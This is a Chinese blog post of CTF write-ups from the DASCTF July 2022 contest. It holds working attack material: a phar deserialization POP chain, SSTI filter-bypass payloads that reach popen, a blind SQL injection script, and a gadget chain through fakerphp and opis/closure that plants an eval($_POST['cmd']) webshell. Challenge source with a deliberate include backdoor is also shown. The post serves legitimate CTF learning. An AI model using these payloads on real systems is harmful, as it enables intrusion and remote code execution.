---
title: DASCTF 2022 7月赋能赛 writeup
date: 2022-07-24 18:34:00
updated: 2022-07-24 18:34:00
tags: [ctf,security]
description: DAS的练手小比赛啦，打的不太好，继续沉淀
---
目前水平确实不足，下午看了几个小时的题目只出了一道web签到题，感觉这DAS的比赛纯粹为了CTF而出题，就像Ez to getflag这个题目，作为一个用户来说上传了一个1.png然后输入1.png查询查不到的话，这应该很难认为是个能用的web服务，纯ctf技巧题吧，比赛时候也做了非常久。

## Web

### Ez to getflag

一个文件上传的简单功能，总共俩接口 一个上传一个查询。
在接口/upload.php 的响应头中发现PHP/7.4.11。
查询接口有WAF 不能用`..`，但是可以读取源码。

源码
upload.php

```php
<?php
    error_reporting(0);
    session_start();
    require_once('class.php');
    $upload = new Upload();
    $upload->uploadfile();
?>
```

file.php

```php
<?php
    error_reporting(0);
    session_start();
    require_once('class.php');
    $filename = $_GET['f'];
    $show = new Show($filename);
    $show->show();
?>
```

class.php

```php
<?php
    class Upload {
        public $f;
        public $fname;
        public $fsize;
        function __construct(){
            $this->f = $_FILES;
        }
        function savefile() {  
            $fname = md5($this->f["file"]["name"]).".png";
            if(file_exists('./upload/'.$fname)) {
                @unlink('./upload/'.$fname);
            }
            move_uploaded_file($this->f["file"]["tmp_name"],"upload/" . $fname);
            echo "upload success! :D";
        }
        function __toString(){
            $cont = $this->fname;
            $size = $this->fsize;
            echo $cont->$size;
            return 'this_is_upload';
        }
        function uploadfile() {
            if($this->file_check()) {
                $this->savefile();
            }
        }
        function file_check() {
            $allowed_types = array("png");
            $temp = explode(".",$this->f["file"]["name"]);
            $extension = end($temp);
            if(empty($extension)) {
                echo "what are you uploaded? :0";
                return false;
            }
            else{
                if(in_array($extension,$allowed_types)) {
                    $filter = '/<\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i';
                    $f = file_get_contents($this->f["file"]["tmp_name"]);
                    if(preg_match_all($filter,$f)){
                        echo 'what are you doing!! :C';
                        return false;
                    }
                    return true;
                }
                else {
                    echo 'png onlyyy! XP';
                    return false;
                }
            }
        }
    }
    class Show{
        public $source;
        public function __construct($fname)
        {
            $this->source = $fname;
        }
        public function show()
        {
            if(preg_match('/http|https|file:|php:|gopher|dict|\.\./i',$this->source)) {
                die('illegal fname :P');
            } else {
                echo file_get_contents($this->source);
                $src = "data:jpg;base64,".base64_encode(file_get_contents($this->source));
                echo "<img src={$src} />";
            }

        }
        function __get($name)
        {
            $this->ok($name);
        }
public function__call($name, $arguments)
        {
            if(end($arguments)=='phpinfo'){
                phpinfo();
            }else{
                $this->backdoor(end($arguments));
            }
            return $name;
        }
        public function backdoor($door){
            include($door);
            echo "hacked!!";
        }
        public function __wakeup()
        {
            if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
                die("illegal fname XD");
            }
        }
    }
    class Test{
        public $str;
public function__construct(){
            $this->str="It's works";
        }
        public function __destruct()
        {
            echo $this->str;
        }
    }
?>
```

由于show方法中file_get_contents()函数参数可控，我们可以通过phar伪协议来读取我们上传的phar格式的文件。这里我们通过构造POP链，通过反序列化控制`include($door)`中的参数，从而通过`include`函数包含`/flag`文件，来读取flag。

EXP:

```php
<?php include('class.php');


$t = new Test();
$t->str = new Upload();
$t->str->fname = new Show('1.png');
$t->str->fsize = '/flag';
// $poc = serialize($t);

$phar = new Phar('poc.phar');
$phar->stopBuffering();
$phar->setStub('GIF89a' . '<?php __HALT_COMPILER();?>');
$phar->addFromString('test.txt', 'test');
$phar->setMetadata($t);
$phar->stopBuffering();

// print($poc);
```

生成poc.phar文件

```bash
gzip poc.phar
```

使用gzip压缩来绕过对文件内容的检测，得到`poc.phar.gz`,改名为`poc.png`。

由于是采用文件名的md5值的方式，读取`phar://./upload/ba48d64c6886e802cd5f65e99e8566ee.png`即可。
![图 1](https://s2.loli.net/2022/07/24/k6PNqflvVX4xmSz.png)  

一些值得反思的地方：
1.为什么要用phar伪协议？因为题目不管你上传什么，都会给你的命名为md5.png,这样的话你虽然可以想办法传一个内容是png的php文件，比如说用`test.php%00.png`来绕过，这完全可以，但是却没办法当成php文件去执行。所以我们只能选择上传一个phar内容的文件，而没有办法用图片马，因为phar格式的文件即便是后缀被修改了，使用phar://这个伪协议读取，还是会按照phar的内容来解析的，甚至是用gzip压缩phar文件，修改后缀上传，也会自动解压一层并且按照phar内容来解析。

2.有没有办法实现RCE？这里只做到了任意文件读取，读取到了flag,有没有可能控制include的函数的参数为data伪协议或者file伪协议，来让include函数包含远程文件，从而实现RCE呢？题目中如果$door接收到参数为phpinfo，那么就会直接执行phpinfo()；借此我们可以查看环境变量中`allow_url_fopen = on` 和 `allow_url_include = off`，前者用于file_get_content，而后者用于`include`,因此我们没有办法通过控制include函数的参数来包含远程的文件。

复盘题目的过程中，在phpinfo中甚至可以找到从环境变量里面读进来的flag？？就离谱
![图 2](https://s2.loli.net/2022/07/24/uXbpDEMWyP7UhvC.png)  

??????不会出题建议是别出
![图 3](https://s2.loli.net/2022/07/24/VudLM3Oqe4DiHFt.png)  

### Harddisk

一道SSTI模板注入的题，有非常恶心的过滤，感觉就没什么意思，为了出题而出题（，做题的方法就是先手动Fuzz一下过滤的字符，`{{}}`过滤用`{% if ("".__class__) %>aa<%endif%>`绕过，` `过滤用%0d，也就是回车(CR)来绕过，`.`用`|attr`绕过，`_`用unicode编码绕过,`[]`用__getitem__`结合`attr()`使用，题目中eval没有过滤，可以弹shell到服务器上。

```python
{%if(""|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"))%}success{%endif%}    # {%if("".__class__)%}success{%endif%}
```

```python
{%if("".__class__.__bases__[0].__subclasses__()[遍历].__init__.__globals__["popen"])%}success{%endif%}  

-->>  

{%if(""|attr("__class__")|attr("__bases__")|attr("__getitem__")(0)|attr("__subclasses__")()|attr("__getitem__")(遍历)|attr("__init__")|attr("__globals__")|attr("__getitem__")("popen"))%}success{%endif%}  -->>  

-->>  

{%if(""|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(0)|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(遍历)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u0070\u006f\u0070\u0065\u006e"))%}success{%endif%}
```

### 绝对防御

题目环境是一张背景图片+一堆js文件，连接口都找不到，显然需要自己找入口。

![图 1](https://s2.loli.net/2022/07/26/CzdaHTPD2lUieBu.png)  

使用工具[JSFinder](https://github.com/Threezh1/JSFinder)查找了一下js中的子域名

```bash
~/workspace/projects/CTF_Tools/JSFinder master
❯ python JSFinder.py -u http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/
url:http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/
Find 31 URL:
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/2V.ny
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/a4?4a=
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/qk.js
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/2V.js
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/a4
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/rN.js?a9=
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/1J/s1.js?5q=
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/fN://uk.tJ.8j/r0/-1
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/this.program
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/dev/stdin
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/tmp
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/home
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/home/web_user
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/dev
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/dev/null
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/dev/tty
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/dev/tty1
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/dev/shm
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/dev/shm/tmp
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/proc
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/proc/self
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/proc/self/fd
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/dev/stdout
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/dev/stderr
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/tokenGetHistoryMessage?_appid=app.web&token=
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/tokenSendMessage
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/tokenRecallMessage
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/sys/tokenUploadImage
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/sys/tokenClearUnreadCount
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/sys/tokenGetConversationList?_appid=app.web&token=
http://c9505b0b-d41e-4277-b990-c846c2312d85.node4.buuoj.cn:81/SUPPERAPI.php
```

我觉得一眼过去这个`SUPPERAPI.php`的名字和后缀都很难认为没问题，访问一下看看。

```js
function getQueryVariable(variable)
{
       var query = window.location.search.substring(1);
       var vars = query.split("&");
       for (var i=0;i<vars.length;i++) {
               var pair = vars[i].split("=");
               if(pair[0] == variable){return pair[1];}
       }
       return(false);
}

function check(){
  var reg = /[`~!@#$%^&*()_+<>?:"{},.\/;'[\]]/im;
        if (reg.test(getQueryVariable("id"))) {
            alert("提示：您输入的信息含有非法字符！");
            window.location.href = "/"
         }
}
check()
```

`SUPPERAPI.php`文件中不停的执行check()，会将传入的id参数的内容进行正则匹配，如果不符合就重定向到`/`这个路由，简单尝试一下之后这里判断出应该是一个sql注入。

![图 2](https://s2.loli.net/2022/07/26/pJOf8neCPS2abkW.png)  

![图 3](https://s2.loli.net/2022/07/26/GmE7j34HXNzsLCY.png)  

这里的话校验写在js部分，第一个念头是写在js的校验可以绕过么？这里是页面会执行check()这个函数，如果访问页面`reg`匹配到正则表达式中的就把用户页面重定向到`/`这个路由，但是我直接给接口发http的包是没关系的。

![图 4](https://s2.loli.net/2022/07/26/SwMTbRvrVqlQxpU.png)  

判断是数字型注入。

![图 5](https://s2.loli.net/2022/07/26/EgYVUySDjfuM8sL.png)  

返回字段数为3。

![图 6](https://s2.loli.net/2022/07/26/2748i6m5WbuzyLR.png)  

尝试UNION注入发现后端存在过滤，用sql的fuzz字典跑一下看看到底过滤了哪些。不过看了看github这个4.5k star的fuzz字典里sql的部分，感觉也不是很好用，还是手动fuzz一下叭。

fuzz出来发现`union`,`if`,`sleep`都被过滤了，那我们尝试用布尔盲注。

```python
import requests as req
import time

url = "xxx/SUPPERAPI.php?"
res = ''
length = 1000
for i in range(1,length+1):
    low = 0x00
    high = 0x7f
    while(low <= high):
        mid = (high + low) // 2
        print(low, mid, high)
        # payload = f"id=1 and (select length(database())>{mid})"
        # payload = f"id=1 and ascii(substr((select database()),{i},1))>{mid}"
        # payload = f"id=1 and ascii(substr((select group_concat(table_name) from information_schema.tables where database()='ctf'), {i}, 1)) > {mid}"
        # payload = f"id=1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 'users'), {i}, 1)) > {mid}"
        # payload = f"id=1 and ascii(substr(reverse((select password from users where id=2)), {i}, 1)) > {mid}"
        # payload = f"id=1 and ascii(substr((select password from users where id=2),{i},1))>{mid}"
        print(payload)
        response = req.get(url + payload)
        # print(len(response.text))
        ## 二分法条件
        if(len(response.text) > 587):
            low = mid + 1
        else:
            high = mid - 1
        time.sleep(0.5)
        # print("[+]:", low, res)
    res += chr(low)
    print("[+]:", low, res)
print(res)
```

一路跑出flag还是比较轻松的，也没什么过滤，比较常见的布尔盲注。

### Newser

这题是比赛时候的0解题，当时也没空看，现在赛后根据wp复现一下。

`/composer.json`中可以得到依赖版本。

```json
{
  
    "require": {
        "fakerphp/faker": "^1.19",
        "opis/closure": "^3.6"
    }
}
```

访问题目环境直接回显User类的源代码

```php

<?php

class User
{
    protected $_password;
    protected $_username;
    private $username;
    private $password;
    private $email;
    private $instance;


    public function __construct($username,$password,$email)
    {
        $this->email = $email;
        $this->username = $username;
        $this->password = $password;
        $this->instance = $this;
    }

    /**
     * @return mixed
     */
    public function getEmail()
    {
        return $this->email;
    }

    /**
     * @return mixed
     */
    public function getPassword()
    {
        return $this->password;
    }

    /**
     * @return mixed
     */
    public function getUsername()
    {
        return $this->username;
    }

    public function __sleep()
    {
        $this->_password = md5($this->password);
        $this->_username = base64_encode($this->username);
        return ['_username','_password', 'email','instance'];
    }

    public function __wakeup()
    {
        $this->password = $this->_password;
    }

    public function __destruct()
    {
        echo "User ".$this->instance->_username." has created.";
    }
}
```

根据前端回显`User xxx has created.`，说明__destruct方法被调用。

发现Cookie中存在`user:Tzo0OiJVc2VyIjo0OntzOjEyOiIAKgBfdXNlcm5hbWUiO3M6ODoiYm1Wc2N6YzAiO3M6MTI6IgAqAF9wYXNzd29yZCI7czozMjoiZDA4MjliYzA0OGNlOWJmMmVmOTAwZDg2MDRkNzFjYTUiO3M6MTE6IgBVc2VyAGVtYWlsIjtzOjI3OiJjaGVsc2V5LnNjaHJvZWRlckBnbWFpbC5jb20iO3M6MTQ6IgBVc2VyAGluc3RhbmNlIjtyOjE7fQ%3D%3D`

base64解码得到

```php
O:4:"User":4:{s:12:"*_username";s:8:"bmVsczc0";s:12:"*_password";s:32:"d0829bc048ce9bf2ef900d8604d71ca5";s:11:"Useremail";s:27:"chelsey.schroeder@gmail.com";s:14:"Userinstance";r:1;}
```

说明序列化后的用户信息会被base64编码后存储在cookie中。

__destruct方法对字符串进行了拼接处理，我们可以用这个方法来作为反序列化的入口触发`__get`方法。依赖中引用的fakephp是一个用来生成模拟数据的依赖。这个依赖的Generator类生成不存在的属性时会通过format方法，而format方法中存在`call_user_func_array`的调用。

```php
public function __get($attribute)
    {
        trigger_deprecation('fakerphp/faker', '1.14', 'Accessing property "%s" is deprecated, use "%s()" instead.', $attribute, $attribute);

        return $this->format($attribute);
    }
public function format($format, $arguments = [])
    {
        return call_user_func_array($this->getFormatter($format), $arguments);
    }
public function __wakeup()
    {
        $this->formatters = [];
    }
public function getFormatter($format)
    {
        if (isset($this->formatters[$format])) {
            return $this->formatters[$format];
        }
    }
```

因为这里有__wakeup,因此无法获取到formatter，还有一个ValidGenerator类也可以用__get -> __call来完成反序列化的利用，但是作者在这里添加了waf，程序如果触发`__call`会直接die,因此只能想办法绕过__wakeup。

这里可以使用形如`$this->a=$this->b//$this->formatters 是xxx->$a的引用`的语句，并且让语句在Generator类的__wakeup后就可以完成利用，而User类的__wakeup这里刚好可以做到。

```php
<?php
namespace {
    class User{
        private $instance;
        public $password;
        private $_password;

        public function __construct()
        {
            $this->instance = new Faker\Generator($this);
            $this->_password = ["_username"=>"phpinfo"];

        }
    }
    echo base64_encode(str_replace("s:8:\"password\"",urldecode("s%3A14%3A%22%00User%00password%22"),serialize(new User())));
}
namespace Faker{
    class Generator{
        private $formatters;
        public function __construct($obj)
        {
            $this->formatters = &$obj->password;
        }
    }
}
```

又因为是通过__get传入，传入函数的参数不可控制，可以执行phpinfo这种不需要参数的函数，但是想要实现RCE就要能够控制函数参数，这里可以使用反序列化闭包，包含`closure`依赖中的autoload.php。

```php
<?php
namespace {
    class User{
        private $instance;
        public $password;
        private $_password;

        public function __construct()
        {
            $this->instance = new Faker\Generator($this);
            $func = function(){eval($_POST['cmd']);};//可写马，测试用的phpinfo;
            require 'closure/autoload.php';
         $b=\Opis\Closure\serialize($func);
           $c=unserialize($b); 
            $this->_password = ["_username"=>$c];

        }
    }
    echo base64_encode(str_replace("s:8:\"password\"",urldecode("s%3A14%3A%22%00User%00password%22"),serialize(new User())));
}
namespace Faker{
    class Generator{
        private $formatters;
        public function __construct($obj)
        {
            $this->formatters = &$obj->password;
        }
    }
}
```
